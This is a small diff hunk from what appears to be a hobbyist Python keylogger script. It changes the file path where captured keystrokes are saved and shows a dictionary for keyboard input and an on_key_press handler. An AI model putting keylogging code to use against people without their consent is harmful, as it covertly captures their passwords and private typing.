@@ -4,7 +4,7 @@ from datetime import datetime            #Import a library that records date and
 
 dicti = {}                                          #A dictionary for saving input from the keyboard.
 str_for_show = ''
-filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"
+filename = r"C:\Users\menachem shoval\Desktop\myTestRepo1\kodcod1 file for kelogger.txt"
 
 
 def on_key_press(key):
